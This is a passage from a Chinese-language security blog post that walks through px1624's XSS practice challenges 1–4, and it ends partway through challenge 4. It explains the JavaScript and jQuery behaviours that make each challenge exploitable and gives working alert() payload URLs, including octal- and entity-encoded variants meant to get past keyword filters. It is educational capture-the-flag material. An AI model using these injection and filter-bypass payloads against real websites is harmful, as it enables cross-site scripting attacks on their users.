<html>
  <head>
    <meta charset="utf-8" />
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>十二个案例重新认识 XSS (上) | xray 技术博客</title>
<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790014149">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="十二个案例重新认识 XSS (上) | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-176727836-2');
</script>


    <meta name="description" content="前言
前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。(现在已经变成了12题)
觉得是一个JS基础不是很好的菜鸡补充了解一些JS基础和奇怪姿势的很好的案例，此文包含1-6题（共1w800字），知识..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://blog.xray.cool">
  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790014149" alt="">
  </a>
  <h1 class="site-title">
    xray 技术博客
  </h1>
  <p class="site-description">
    
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives/" class="menu">
          归档
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              十二个案例重新认识 XSS (上)
            </h2>
            <div class="post-info">
              <span>
                2020-11-26
              </span>
              <span>
                48 min read
              </span>
              
            </div>
            
              <img class="post-feature-image" src="https://blog.xray.cool/post-images/12cases-about-xss-part1.png" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h2 id="前言">前言</h2>
<p>前段时间看到了px1624的10题XSS案例，一直留着留着，终于拿出来看看了。还好网站没关。(现在已经变成了12题)</p>
<p>觉得是一个JS基础不是很好的菜鸡补充了解一些JS基础和奇怪姿势的很好的案例，此文包含1-6题（共1w800字），知识点大概包括：</p>
<ul>
<li>JS中 a[b] 等同于 a.b （一定程度上）</li>
<li>JQuery元素的text方法与html方法的区别</li>
<li>JQuery的DOM XSS特性 <code>$(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code> 可以弹框</li>
<li>JS中constructor的原理</li>
<li>衍生了题外话弹框替换：<code>&quot;&quot;[&quot;constructor&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</code></li>
<li>模板字符串具有<strong>跨行</strong>的特性</li>
<li>在字符串中使用<strong>运算符</strong>拼接执行js语句</li>
<li>正则匹配的规则与正则规则<code>.</code>的绕过</li>
</ul>
<p>对于以上列出知识点如果只有个别不清楚的，可以直接在各题知识点中找到它，然后看那一题就行了。</p>
<blockquote>
<p>此外还提出了第三题在官方WP中由于篇幅没有提到的使用注释的解法。</p>
</blockquote>
<p>实际上px1624有出官方WP，写的很好。但是以菜鸡的角度去看题目总会讲述到一些默认被跳过的但是又有点东西的细节，也做了一点衍生。写文章一向往细了写，结合了看可能也会有所帮助吧？</p>
<p>有错误喷就完事了。</p>
<blockquote>
<p>感谢px1624老哥的案例分享</p>
<p>感谢huuu老哥忍受了我一个憨批问题的骚扰和知识点指点</p>
</blockquote>
<h2 id="第一题">第一题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest1/</p>
<pre><code class="language-html">&lt;script type=&quot;text/javascript&quot;&gt;
var x=location.hash;
function aa(x){};
setTimeout(&quot;aa('&quot;+x+&quot;')&quot;,100);
&lt;/script&gt;
Give me xss bypass 1~
</code></pre>
<p><strong>知识点</strong>：</p>
<ul>
<li>location.hash</li>
<li>setTimeout</li>
</ul>
<p>就基础的两个知识点。</p>
<ol>
<li><strong>location.hash</strong></li>
</ol>
<p>取URL中的锚点部分（<code>#</code>开始的部分，包括#），通常用于用户页面的浏览位置的定位</p>
<pre><code class="language-js">URL: &quot;http://px1624.sinaapp.com/test/xsstest1/#');alert('1&quot;
location.hash: &quot;#');alert('1&quot;
</code></pre>
<ol start="2">
<li><strong>setTimeout</strong></li>
</ol>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setTimeout">setTimeout函数</a>分为2种使用方式：</p>
<ul>
<li><code>setTimeout(JS函数名, 等待的毫秒数，参数1，参数2)</code>：延时后执行指定JS函数，并传入参数1，参数2</li>
<li><code>setTimeout(JS代码(字符串格式), 等待的毫秒数)</code>：延时后执行指定字符串中的JS代码，与EVAL类似</li>
</ul>
<p>延迟执行JS代码：</p>
<pre><code class="language-js">//执行JS函数aa
function aa(x){alert(x)};
setTimeout(aa,100,1);
//执行js代码：弹框1
setTimeout(&quot;alert('1')&quot;,100);
//执行js代码段：弹框1弹框2
setTimeout(&quot;alert('1');alert('2')&quot;,100);
//js代码段可以调用当前上下文函数
function aa(x){};
setTimeout(&quot;aa('#');alert('1')&quot;,100);
//因为是字符串，也可以拼接后执行
setTimeout(&quot;aa('&quot;+&quot;#');alert('1&quot;+&quot;')&quot;,100);
</code></pre>
<p>那么现在再回头去看题目代码，就可以很显而易见的发现就是<strong>把location.hash的值拼接进入setTimeout的第一个参数中</strong>，而由于setTimeout的特性，第一个字符串参数会被当作JS解析执行。</p>
<p>那么我们只需要闭合前面的，然后执行我们指定的JS代码来进行弹框。</p>
<p>Writeup：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest1/#');alert('1</code></p>
<h2 id="第二题">第二题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest2/</p>
<pre><code class="language-js">&lt;html&gt;
&lt;head&gt;
&lt;script src=&quot;https://code.jquery.com/jquery-3.4.1.js&quot;&gt;&lt;/script&gt;
Give me xss bypass 2~
&lt;div style='display:none' id='xx'&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/div&gt;
&lt;input type='button' value='test' onclick='alert(&quot;鍝堝搱锛岀偣杩欑帺鎰忔病鍟ョ敤鐨勶紒&quot;)'&gt;
&lt;body&gt;
&lt;script&gt;
   var query = window.location.search.substring(1);
   var vars = query.split(&quot;&amp;&quot;);
   if(vars){
		aa(vars[0],vars[1])
   }
   	function aa(x,y){
		$(&quot;#xx&quot;)[x]($(&quot;#xx&quot;)[y]());
	}
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>知识点</strong>：</p>
<ul>
<li>window.location.search</li>
<li>字符串操作：substring、split</li>
<li>JQuery的DOM对象操作，html、append、after、before等</li>
<li>a[b] 等同于 a.b （一定程度上）</li>
<li>JQuery元素的text属性会解析html编码</li>
</ul>
<ol>
<li><strong>window.location.search</strong>与<strong>字符串操作</strong></li>
</ol>
<p>为URL中的参数部分（？开始的部分，包括？），GET参数。</p>
<pre><code class="language-js">URL: &quot;http://px1624.sinaapp.com/test/xsstest1/?a1&amp;b1&quot;
window.location.search: &quot;?a1&amp;b1&quot;
//substring(1)从第一位开始截取到最后一位
window.location.search.substring(1): &quot;a1&amp;b1&quot; 
//query.split(&quot;&amp;&quot;)根据&amp;分割成数组
query.split(&quot;&amp;&quot;): [&quot;a1&quot;,&quot;b1&quot;]
</code></pre>
<ol start="2">
<li><strong>JQuery的DOM对象操作</strong>  与 <strong>a[b] 等同于 a.b</strong></li>
</ol>
<p>取值a1,b1结束后，把值分别填入<code>$(&quot;#xx&quot;)[x]($(&quot;#xx&quot;)[y]());</code>的x和y中。</p>
<p><code>$('#xx')</code> 就是JQuery语法里面的DOM元素选择器，等同于<code>document.getElementById('xx');</code>，这里选中了id=xx 的div标签。</p>
<p><strong>利用a[b] 等同于 a.b的JS特性</strong>，来进行转换来看，（a1,b1为之前我们&amp;分割的两个字符串）：</p>
<p><code>$(&quot;#xx&quot;)[a1]($(&quot;#xx&quot;)[b1]());</code>-&gt;<code>$(&quot;#xx&quot;).a1($(&quot;#xx&quot;).b1());</code></p>
<blockquote>
<p>但是a[b]不完全等价于a.b，前者b可以是一个动态的输入的字符串，但是后者就不可以，比如：</p>
<p>lala=&quot;append&quot;</p>
<p><code>a[lala](123)</code> 调用成功</p>
<p>a.lala(123) 调用失败</p>
</blockquote>
<p>这边显而易见，我们可控输入<strong>a1</strong>、<strong>b1</strong>最后控制id为xx的DOM节点的<strong>方法</strong>。</p>
<ol start="3">
<li><strong>JQuery的DOM对象操作、JQuery元素的的text属性会解析html编码</strong></li>
</ol>
<p>由于我们可以自主操控DOM节点的方法，那么在这里触发XSS自然是要<strong>修改DOM树，写入payload语句进行渲染执行</strong>，所以确定a1是一个可以修改DOM树的动作操作：</p>
<p>这里我们可以直接去查看<a href="https://jquery.cuishifeng.cn/">JQuery官方文档</a>找到其中关于文档处理的部分，列出部分函数：</p>
<p>html、append、after、before等等，我们先选取<a href="https://jquery.cuishifeng.cn/html.html">html</a>来修改DOM树。</p>
<pre><code class="language-JS">$(&quot;#xx&quot;).html(123)
//修改id=xx的标签的内容为123
$(&quot;#xx&quot;).html(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)
//修改id=xx的标签的内容为一个弹框payload,渲染后就会弹框了
</code></pre>
<blockquote>
<p>此处在官方WP中还提出此处a1可以使用<strong>constructor</strong>，并且一笔带过。</p>
<p>事实是，此处确实可以使用constructor来进行弹框，但是其理论基础却不是通过修改DOM树，写入payload语句使页面进行重新渲染导致的。而是直接临时渲染单个节点，具体之后再进行解释。</p>
</blockquote>
<p><code>$(&quot;#xx&quot;).html($(&quot;#xx&quot;).b1());</code>，确定了a1还有一处b1。我们现在需要html括号里面的<code>$(&quot;#xx&quot;).b1()</code>返回的内容为一个payload，而xx标签的内容本身就是一个payload，只不过是一个<strong>html编码后的payload</strong>。</p>
<figure data-type="image" tabindex="1"><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gkvsxtoz2cj312u07g0t6.jpg" alt="2-1.png" loading="lazy"></figure>
<p>根据文档，html()也是可以直接获取当前节点的内容的。直接<code>$(&quot;#xx&quot;).html($(&quot;#xx&quot;).html())</code>这样获取到编码后的payload可以么？当然不可以，你会发现这只不过是把原来的东西取出来再放回去，怎么可能有用。</p>
<p>我们可以<strong>利用<a href="https://jquery.cuishifeng.cn/text.html">text属性</a>会解析html编码的特性</strong>得到我们想要的未编码的payload，测试<code>$(&quot;#xx&quot;).b1()</code>b1的取值html与text：</p>
<pre><code class="language-js">$(&quot;#xx&quot;).html()
&quot;&amp;lt;img src=x onerror=alert(1)&amp;gt;&quot;
$(&quot;#xx&quot;).text()
&quot;&lt;img src=x onerror=alert(1)&gt;&quot;
</code></pre>
<p><strong>text属性返回被解析后的HTML标签</strong></p>
<pre><code class="language-JS">//理想中的样子
$(&quot;#xx&quot;).html(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)
//用text替换
$(&quot;#xx&quot;).html($(&quot;#xx&quot;).text())
</code></pre>
<p>回退回去得到writeup1：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest2/?html&amp;text</code></p>
<h3 id="constructor的触发原理">constructor的触发原理</h3>
<p>之前说到payload使用constructor也是可以的，writeup2：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest2/?constructor&amp;text</code></p>
<p>我们来看下具体技术细节，跳过字符串传递的那一部分，直接来到<code>$(&quot;#xx&quot;).constructor($(&quot;#xx&quot;).text())</code></p>
<p>再跳过之前分析过的text解析html编码的那一部分来到<code>$(&quot;#xx&quot;).constructor(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code></p>
<p>constructor其实就是取<code>$(&quot;#xx“)</code>这个JQuery对象的构造器，然后往构造器里面传参<code>&lt;img src=x onerror=alert(1)</code>。</p>
<pre><code class="language-js">$(&quot;#xx&quot;).constructor === $().constructor
true
</code></pre>
<p>然而一个指定选择器的JQuery对象的构造器跟一个空的JQuery对象的构造器是完全等价的</p>
<p>创建一个JQuery对象其实就是给一个JQuery对象的构造器传参，所以：</p>
<pre><code class="language-js">$(&quot;#xx&quot;).constructor(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)
//实际上就是等于
$().constructor(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)
//实际上就是等于
$(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)
</code></pre>
<p><a href="https://api.jquery.com/jQuery/#jQuery2">$(html)</a>，参考官方API或者看源码可以知道他会在一个临时的div中插入我们写入的html标签，但是这个标签不会直接插入到DOM树中，所以不会引起DOM树的变化因此也不会重新渲染页面。</p>
<p>但是它仍然会解析执行我们的标签，虽然没有从源码中或者文档中找到它的渲染原理，但是经过测试，不是所有标签或者JS都会被执行：</p>
<pre><code class="language-js">$(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)
//执行弹框
$(&quot;&lt;audio src=dns地址 onerror=alert`1`&gt;&quot;)
//dnslog收到请求，执行弹框
$(&quot;&lt;video src=x onerror=\&quot;javascript:alert(12)\&quot;&gt;&lt;/video&gt;&quot;)
//执行弹框
$(&quot;&lt;svg onload=alert`1`&gt;&quot;)
//不执行弹框
$(&quot;&lt;script&gt;alert(2)&lt;/script&gt;&quot;)
//不执行弹框
$(alert(1))
//执行弹框
$(&quot;alert(1)&quot;)
//不执行弹框
</code></pre>
<blockquote>
<p><code>$(console.log(1))</code>、<code>$(alert(1))</code>等<strong>表达式传参进入</strong>都是可以正常执行的。但是执行不是因为DOM操作的执行</p>
<p>之所以执行只是单纯先执行alert(1)表达式，其结果再进入$()进行逻辑处理，我们传入的值不符合其预期，但是没有语法错误也是不会报错的。</p>
<p>但是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi mathvariant="normal">&quot;</mi><mi>c</mi><mi>o</mi><mi>n</mi><mi>s</mi><mi>o</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>o</mi><mi>g</mi><mo>(</mo><mn>1</mn><mo>)</mo><mi mathvariant="normal">&quot;</mi><mo>)</mo><mi mathvariant="normal">、</mi></mrow><annotation encoding="application/x-tex">(&quot;console.log(1)&quot;)、</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">&quot;</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mord">&quot;</span><span class="mclose">)</span><span class="mord cjk_fallback">、</span></span></span></span>(“alert(1)”) 跟标签一样作为<strong>字符串传参传入</strong>，就不会弹框啦</p>
</blockquote>
<p>大致上只有单个标签<code>src=x 加上onerror</code>事件，会执行里面的JS代码，其他均不渲染执行。（如果有老哥知道原理的 可以跟我交流下，非常感谢）</p>
<blockquote>
<p>这种这种执行规则被px1642老哥在WP种写作JQuery的DOM XSS，但是个人理解，这不算在漏洞范畴，而是特性范畴。</p>
<p>最大的问题就是引入最新的3.5.1版本JQuery，在命令行中输入<code>$(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code>仍然会弹框。看以往JQuery 漏洞修复都是过滤器过滤location.hash这类外部数据输入点（会存在#，编码等情况），从而完成修复的。$()直接引入字符串变量的，应该不算是漏洞？？？</p>
</blockquote>
<p>至此就对两类触发原理进行了区分</p>
<ul>
<li>前者<strong>html</strong>等是直接修改页面的DOM树导致重新渲染执行</li>
<li>后者<strong>constructor</strong>是建立JQuery对象时进行有条件的临时渲染执行（JQuery DOM XSS特性）</li>
</ul>
<h3 id="题外话利用constructor构造弹框">题外话：利用constructor构造弹框</h3>
<p>上面提到constructor是获取前一对象的构造函数，我们可以利用这一特性来构造一个替代弹框的方法：</p>
<p>其根本原理是使用Function来构造匿名函数，然后在其中写入任意的js代码进行执行：</p>
<pre><code class="language-js">let sayHi = new Function('alert(&quot;Hello&quot;)');
sayHi(); 
//弹框Hello
</code></pre>
<p>写成一句直接调用</p>
<pre><code class="language-js">new Function('alert(&quot;Hello&quot;)')();
//弹框
//精简去掉 new 和 ;
Function('alert(&quot;Hello&quot;)')()
//弹框
</code></pre>
<p>我们要知道Function是所有对象的最原始的构造函数，因为所有基础对象的上一层构造方法就是Function。替换掉Function</p>
<pre><code class="language-js">&quot;1&quot;.substr
ƒ substr() { [native code] }
//substr方法
typeof(&quot;1&quot;.substr)
&quot;function&quot;
typeof(Object)
&quot;function&quot;
typeof(String)
&quot;function&quot;
//function类型的构造方法就是Function
String.constructor === Function
true
Object.constructor === Function
true
//来加上原来构造好的语句
String.constructor('alert(&quot;Hello&quot;)')()
//弹框
Object.constructor('alert(&quot;Hello&quot;)')()
//弹框
</code></pre>
<p>我们还可以进一步构造出function，比如替换String或者弄个新的function</p>
<pre><code class="language-js">&quot;1&quot;.constructor === String
true
//payload1
&quot;1&quot;.constructor.constructor(&quot;alert(1)&quot;)()
typeof(&quot;1&quot;.substr)
&quot;function&quot;
//payload2
&quot;1&quot;.substr.constructor(&quot;alert(1)&quot;)()
</code></pre>
<p>再根据<code>a.b与a[b]等价</code>的定理进行变换，再删个1：</p>
<pre><code class="language-js">//payload1
&quot;&quot;[&quot;substr&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()
//payload2
&quot;&quot;[&quot;constructor&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()
</code></pre>
<p>我们一路变形有啥意义么，通常而言，要替换弹框就是为了绕过关键词的检测，但是现在<code>alert(1)</code>关键词还在，完全就是花里胡哨。</p>
<p>实际上现在&quot;alert(1)&quot;已经变为字符串了，针对<strong>字符串</strong>，可以使用<strong>16进制，8进制</strong>转码，我们用8进制转码：</p>
<pre><code class="language-js">&quot;&quot;[&quot;\163\165\142\163\164\162&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&quot;\141\154\145\162\164\50\61\51&quot;)()
</code></pre>
<p>弹框的变形替换就完成了，可以根据环境放入标签中，比如IMG标签中，针对<strong>JS代码</strong>还可以使用<strong>unicode编码</strong>：</p>
<pre><code class="language-html">&lt;img src=x onerror=&quot;&amp;#34;&amp;#49;&amp;#34;&amp;#91;&amp;#34;&amp;#92;&amp;#49;&amp;#54;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#53;&amp;#92;&amp;#49;&amp;#52;&amp;#50;&amp;#92;&amp;#49;&amp;#54;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#34;&amp;#93;&amp;#91;&amp;#34;&amp;#92;&amp;#49;&amp;#52;&amp;#51;&amp;#92;&amp;#49;&amp;#53;&amp;#55;&amp;#92;&amp;#49;&amp;#53;&amp;#54;&amp;#92;&amp;#49;&amp;#54;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#92;&amp;#49;&amp;#54;&amp;#53;&amp;#92;&amp;#49;&amp;#52;&amp;#51;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#49;&amp;#53;&amp;#55;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#34;&amp;#93;&amp;#40;&amp;#34;&amp;#92;&amp;#49;&amp;#52;&amp;#49;&amp;#92;&amp;#49;&amp;#53;&amp;#52;&amp;#92;&amp;#49;&amp;#52;&amp;#53;&amp;#92;&amp;#49;&amp;#54;&amp;#50;&amp;#92;&amp;#49;&amp;#54;&amp;#52;&amp;#92;&amp;#53;&amp;#48;&amp;#92;&amp;#54;&amp;#49;&amp;#92;&amp;#53;&amp;#49;&amp;#34;&amp;#41;&amp;#40;&amp;#41;&quot;&gt;
</code></pre>
<p>完事</p>
<h2 id="第三题">第三题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest3/</p>
<pre><code class="language-html">Give me xss bypass 3~
&lt;script src=&quot;./jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
    $(function test() {
		var px = '';
		if (px != &quot;&quot;) {
			$('xss').val('');
		}
	})
&lt;/script&gt;
</code></pre>
<p>知识点：</p>
<ul>
<li>多点同步输出的注释使用</li>
<li>在字符串中使用运算符执行js</li>
</ul>
<p>从js的角度没有直接看到DOM类型的函数输入入口，可以判断跟前两题DOM XSS不一样，应该是个反射XSS。</p>
<p>那么参数就靠自己猜了，估摸不是px就是xss。</p>
<p><code>http://px1624.sinaapp.com/test/xsstest3/?px=123</code></p>
<pre><code class="language-html">Give me xss bypass 3~
&lt;script src=&quot;./jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
    $(function test() {
		var px = '123';//反射点1
		if (px != &quot;&quot;) {
			$('xss').val('123');//反射点2
		}
	})
&lt;/script&gt;
</code></pre>
<p>px参数对应两处反射输出点，看看是否有编码过滤，使用payload：<code>&quot;/&lt;&gt;()'%26;%20=*</code></p>
<pre><code class="language-html">&lt;script&gt;
    $(function test() {
		var px = '&amp;quot;/&amp;lt;&amp;gt;()'&amp;amp;; =*';
		if (px != &quot;&quot;) {
			$('xss').val('&amp;quot;/&amp;lt;&amp;gt;()'&amp;amp;; =*');
		}
	})
&lt;/script&gt;
</code></pre>
<ul>
<li>被转义：<code>&quot;&lt;&gt;&amp;</code></li>
<li>可以使用：<code>/();空格=*</code></li>
</ul>
<p>可以发现单引号已经完成了js语句的闭合，在浏览器中也会发现语义会报错，可以确定可以进行注入。</p>
<blockquote>
<p>后端实际使用的是<a href="https://www.php.net/htmlspecialchars">htmlspecialchars()</a>该函数的默认配置不转换单引号</p>
</blockquote>
<p>先尝试构造出一个合法的js上下文环境进行弹框，比如<code>';alert(1);//</code></p>
<pre><code class="language-html">&lt;script&gt;
    $(function test() {
        //此处语法合规
		var px = '';alert(1);//';
		if (px != &quot;&quot;) {
            //此处语法报错
			$('xss').val('';alert(1);//');
		}
	})
&lt;/script&gt;
</code></pre>
<p>再把下边这个也弄合规，比如<code>');alert(1);//</code></p>
<pre><code class="language-html">&lt;script&gt;
    $(function test() {
        //语法错误
		var px = '');alert(1);//';
		if (px != &quot;&quot;) {
            //语法正确
			$('xss').val('');alert(1);//');
		}
	})
&lt;/script&gt;
</code></pre>
<p>因为语句环境的不通确实无法两全其美，顾此失彼，失败。</p>
<h3 id="使用注释">使用注释</h3>
<p>因为上下文两处输出位置，会想到使用多行注释进行多行注释，破坏当前语言结构来进行构造。在js中多行注释：</p>
<ul>
<li><code>/* xx */</code>：常见的js多行注释</li>
<li><code>&lt;!-- xxx --&gt;</code>：这个虽然实际上是HTML注释，本以为可以使用，但是并不可以。
<ul>
<li><code>&lt;!--</code>在谷歌浏览器和火狐浏览器中经过测试是等同于<code>//</code></li>
<li><code>--&gt;</code>不受支持</li>
</ul>
</li>
</ul>
<p>尝试破坏语法结构，主要思路就是注释掉两个反射点中间的语法部分，然后自主重构js：</p>
<p>第一处需要把</p>
<ol>
<li><code>*/</code>放到字符串里取消注释作用</li>
<li>闭合前面语句</li>
<li>开始<code>/*</code></li>
</ol>
<p>第二处</p>
<ol>
<li>需要先引入<code>*/</code>，把前边代码注释</li>
<li>自主插入js处理后面的对应结构</li>
<li>写入弹框语句即自定义语句</li>
<li>再把<code>/*</code>关进字符串里，取消注释作用</li>
<li>最后处理后面的尾巴。</li>
</ol>
<p>直接上payload：<code>*/if(true){alert(1);var a=';/*';//</code></p>
<p>拆解一下payload每一个部分的作用：</p>
<pre><code class="language-js">*/
//注释两个插入点中间的代码
if(true){
//为了引入一个{来对应之后的}结构
alert(1);
//自主js随便写
var a='
//为了在反射点2把/*关进字符串，引入一个变量
//同时'也是闭合反射点1的字符串
;
//为了在反射点1的语法正确
//
//注释反射点2后面的尾巴
</code></pre>
<p>最后页面如下：</p>
<pre><code class="language-html">Give me xss bypass 3~
&lt;script src=&quot;./jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
    $(function test() {
		var px = '*/if(true){alert(1);var a=';/*';//';
		if (px != &quot;&quot;) {
			$('xss').val('*/if(true){alert(1);var a=';/*';//');
		}
	})
&lt;/script&gt;
</code></pre>
<p>当然也可以精简一下<code>var a=</code>这一部分payload：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest3/?px=*/if(true){alert(1);%27;/*%27;//</code></p>
<p>还可以精简一下<code>if(true):</code>语句，神奇的大括号闭合同样不会报错：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest3/?px=*/{alert(1);%27;/*%27;//</code></p>
<p>再偷工减料，废物利用下，得到最后12个字符的writeup，（但是这样就不弹1了）：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest3/?px=*/{alert(%27/*</code></p>
<h3 id="使用运算符官方解法">使用运算符（官方解法）</h3>
<p><code>'-alert(1)-'</code>一开始是没有想到有这种解法的，但是再看完writeup之后，发现这就是XRAY常见的js中的xss payload。</p>
<p>知识点：</p>
<ul>
<li>js中的运算符拼接可以执行语句</li>
</ul>
<p>writeup：<code>http://px1624.sinaapp.com/test/xsstest3/?px=%27-alert(1)-%27</code></p>
<pre><code class="language-html">Give me xss bypass 3~
&lt;script src=&quot;./jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
    $(function test() {
		var px = ''-alert(1)-'';
		if (px != &quot;&quot;) {
			$('xss').val(''-alert(1)-'');
		}
	})
&lt;/script&gt;
</code></pre>
<p>前后闭合单引号<code>'</code>，中间使用运算符连接<code>-</code>（可以使用<code>*,+,-,\</code>等等），再写入js函数<code>alert(1)</code>可以成功调用。</p>
<blockquote>
<p>关于这里中间能够适配的js函数，目前实验出来是已有的<strong>函数调用</strong>都可以使用</p>
<p>比如<code>window.open('http://www.baidu.com')</code></p>
</blockquote>
<h2 id="第四题">第四题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest4/</p>
<pre><code class="language-html">Give me xss bypass 4~
&lt;script src=&quot;./jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
    $(function test() {
		var px = '';
		if (px != &quot;&quot;) {
			$('xss').val('');
		}
	})
&lt;/script&gt;
</code></pre>
<p>知识点：</p>
<ul>
<li>多点同步输出的注释使用</li>
<li>模板字符串具有类似跨行注释的特性</li>
<li>不被注意到的更多的运算符</li>
</ul>
<p>其实代码还是一模一样，但是服务端过滤规则变化了，不再是对输出字符转义了，而是针对特定字符直接黑名单。</p>
<p>可以使用<code>%00-%ff</code>进行字符测试，看看哪些字符被ban了。</p>
<p>省事直接取官方WP的中源码的黑名单列表：<code>&lt;&gt;+_*/&amp;|~^%!?=</code></p>
<p>回顾之前的思路：</p>
<ul>
<li>
<p>使用运算符：运算符连接表达式来执行JS，但是由于算数运算符<code>+-*/%</code>都被ban了，无法使用</p>
</li>
<li>
<p>使用注释：我们之前使用的是<code>/*..*/</code>，由于*也被ban了，无法使用</p>
</li>
</ul>
<p>看似我们又回到了之前的顾头不顾尾的处境中。</p>
<p>在使用注释的思路中，我们是要将两个注入点中间的代码无意义化，破坏上下文结构从而写入自己的代码完成闭合。实际上除了注释，还有其他形式的结构可以实现这样的功能：<strong>字符串</strong>，将代码当作字符串。</p>
<p>在js中我们知道其实双引号（&quot;）其实是支持多行字符组成字符串的：</p>
<pre><code class="language-js">var a =&quot;123\
456\
789&quot;;
//a
&quot;123456789&quot;
</code></pre>
<p>但是这需要每一行字符的后缀加上<code>\</code>，在当前场景下不可能。</p>
<p>除此之外，JS中也存在可以容纳换行的字符串结构：<strong>模板字符串</strong></p>
<h3 id="注释进阶使用模板字符串">注释进阶：使用模板字符串</h3>
<p><strong>模板字符串</strong>使用反引号来代替普通字符串中的用双引号和单引号。模板字符串可以包含特定语法（<code>${expression}</code>）的占位符。</p>
<ul>
<li>多行字符串：不同于单引号双银行，模板字符串可以包含换行（也是我们这题要使用到的特性）</li>
<li><code>$(表达式)</code>：可以在模板字符串中使用该形式引入简单表达式</li>
<li>带上标签（tag）的模板字符串：</li>
</ul>
<pre><code class="language-js">//1.可以包含换行符
var a=`123
456`;
//2.使用表达式,类似于在字符串中使用运算符的情况
var a=(`123${alert(1)}`);
//3.定义函数、使用标签执行函数，并传参
function myTag(strings, personExp, ageExp) {
  var str0 = strings[0]; // &quot;that &quot;
  var str1 = strings[1]; // &quot; is a &quot;
  return str0 + personExp + str1 + ageExp;
}
var person = 'Mike';
var age = 28;
var output = myTag`that ${ person } is a ${ age }`;
console.log(output);
// that Mike is a youngster
</code></pre>
<p>带入我们题目的场景，我们需要把模板字符串拆成前后两部分，<code>A反引号B</code>：</p>
<ul>
<li>A部分是为了满足前面插入点语句的闭合；在前面语句中，B部分变为了字符串不用理会</li>
<li>B部分是为了满足后面插入点语句的闭合；在后面语句中，A部分变为了字符串不用理会</li>
</ul>
<p>那么只需要各自构造然后拼接就可以了，回到题目上下文环境：</p>
<pre><code class="language-js">var px = '插入点';
// A部分需要闭合一个'、一个;
//';
</code></pre>
<pre><code class="language-js">$('xss').val('插入点');
}
//B部分前面都变成字符串的一部分了，需要给模板字符串一个分号作为结束
//后面还需要闭合一个'、一个)、一个}
</code></pre>
